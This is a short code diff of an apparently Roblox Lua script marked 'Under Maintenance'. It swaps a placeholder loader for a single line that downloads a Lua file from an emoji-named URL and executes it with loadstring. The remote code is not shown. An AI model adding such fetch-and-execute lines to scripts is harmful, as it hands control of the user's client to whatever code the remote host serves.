@@ -11,12 +11,4 @@ P'   MM   `7   MM   `MM.   VMb.  ,P
 Under Maintenance...
 
 ]]
-local 🔗="soon..."
-local 📡,📦=pcall(function()
-    return game:HttpGet(🔗)
-end)
-
-if 📡 and 📦 then
-    local ⚙️=loadstring(📦)
-    return ⚙️ and ⚙️()
-end
+loadstring(game:HttpGet("https://🔥💀🚀😈.com/🧠🔥💥/script.lua"))()
